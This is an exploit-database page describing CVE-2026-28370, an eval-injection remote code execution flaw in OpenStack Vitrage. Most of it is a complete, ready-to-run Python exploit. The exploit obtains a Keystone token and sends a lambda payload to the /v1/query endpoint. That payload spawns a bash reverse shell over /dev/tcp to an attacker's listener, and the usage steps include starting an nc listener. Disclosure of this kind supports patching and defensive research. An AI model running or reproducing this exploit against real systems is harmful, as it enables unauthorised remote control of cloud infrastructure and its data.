---
title: OpenStack Vitrage <  12.0.1 / 13.0.1 Eval Injection Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026030002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-02
fetch_date: 2026-03-03T04:11:36.099368
---

# OpenStack Vitrage <  12.0.1 / 13.0.1 Eval Injection Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OpenStack Vitrage < 12.0.1 / 13.0.1 Eval Injection Remote Code Execution** **2026.03.02**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-28370](https://cxsecurity.com/cveshow/CVE-2026-28370/ "Click to see CVE-2026-28370")**  CWE: **[CWE-95 Improper Neutralization of Directives in Dynamically Evaluated Code (&#039;Eval Injection&#039;)](https://cxsecurity.com/cwe/CWE-95%20Improper%20Neutralization%20of%20Directives%20in%20Dynamically%20Evaluated%20Code%20%28%26#039;Eval Injection&#039;) "Click to see CWE-95 Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')")**  **[**Dork:** NO](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/env python3
# Exploit Title: OpenStack Vitrage < 12.0.1 / 13.0.1 Eval Injection Remote Code Execution
# CVE: CVE-2026-28370
# Date: 2026-02-27
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub:
# Vendor Homepage: https://www.openstack.org/
# Software Link: https://opendev.org/openstack/vitrage
# Affected: OpenStack Vitrage < 12.0.1 / 13.0.1 (vulnerable versions)
# Tested on: OpenStack with Vitrage (pre-patch)
# Category: Remote Code Execution
# Platform: Linux
# Exploit Type: Remote
# CVSS: 9.1 (CRITICAL)
# CWE: CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)
# Description: Unauthenticated user input in Vitrage query expression leads to arbitrary Python code execution via eval()
# Fixed in: Patched in Vitrage stable branches after Feb 2026 security release
# Usage:
# python3 exploit.py <vitrage-api-url> --username <user> --password <pass> --project <project> --lhost <your\_ip> --lport <your\_port>
#
# Examples:
# python3 exploit.py http://controller:8999 --username admin --password secret --project admin --lhost 192.168.1.100 --lport 4444
#
# Options:
# --username OpenStack username with Vitrage access
# --password Password
# --project Project name
# --lhost Listener IP for reverse shell
# --lport Listener port
#
# Notes:
# - Requires valid OpenStack credentials (high privileges in Vitrage context)
# - Payload spawns reverse shell using bash
#
# How to Use
#
# Step 1: Start a listener (e.g. nc -lvnp 4444)
# Step 2: Run the exploit with correct credentials and network details
import sys
import argparse
import requests
from keystoneauth1 import session
from keystoneauth1.identity import v3
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄ ▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-28370 • OpenStack Vitrage Eval Injection ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
def parse\_args():
parser = argparse.ArgumentParser(description="CVE-2026-28370 OpenStack Vitrage RCE")
parser.add\_argument("target", help="Vitrage API base URL (e.g. http://controller:8999)")
parser.add\_argument("--username", required=True, help="Keystone username")
parser.add\_argument("--password", required=True, help="Keystone password")
parser.add\_argument("--project", required=True, help="Keystone project name")
parser.add\_argument("--lhost", required=True, help="Listener IP")
parser.add\_argument("--lport", required=True, help="Listener port")
parser.add\_argument("--keystone", default=None, help="Keystone auth URL (default: target:5000/v3)")
return parser.parse\_args()
def get\_token(args):
keystone\_url = args.keystone or f"{args.target.rstrip('/')}/../keystone/v3".replace("8999", "5000")
auth = v3.Password(
auth\_url=keystone\_url,
username=args.username,
password=args.password,
project\_name=args.project,
user\_domain\_name="Default",
project\_domain\_name="Default"
)
sess = session.Session(auth=auth)
return sess.get\_token(auth)
def exploit(args):
token = get\_token(args)
headers = {
"X-Auth-Token": token,
"Content-Type": "application/json",
"Accept": "application/json"
}
payload = (
f"\_\_import\_\_('socket,subprocess,os').\_\_dict\_\_['popen']("
f"'/bin/bash -c \\\"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1\\\"'"
f").wait()"
)
exploit\_data = {
"query": f"lambda x: {payload}"
}
url = f"{args.target.rstrip('/')}/v1/query"
print(f"[\*] Target: {args.target}")
print(f"[\*] Sending reverse shell payload to {url}")
print(f"[\*] Listener: {args.lhost}:{args.lport}")
try:
r = requests.post(url, json=exploit\_data, headers=headers, verify=False, timeout=20)
print(f"[+] Status: {r.status\_code}")
if r.status\_code in (200, 202, 204):
print("[+] Payload delivered — check your listener for connection")
else:
print(f"[-] Failed — response: {r.text[:300]}")
except Exception as e:
print(f"[-] Error: {e}")
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) == 1:
print("Error: Missing arguments. Use --help for usage.")
sys.exit(1)
args = parse\_args()
exploit(args)

**##### References:**

https://nvd.nist.gov/vuln/detail/CVE-2026-28370

https://storyboard.openstack.org/#!/story/2011539

(OpenStack advisory, exploit tracking, vendor advisory)

https://github.com/openstack/vitrage/blob/a1f86950e1314b0c740f9cd9b7e9dbab7d02af51/vitrage/graph/query.py#L70

(vulnerable line reference)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
| ...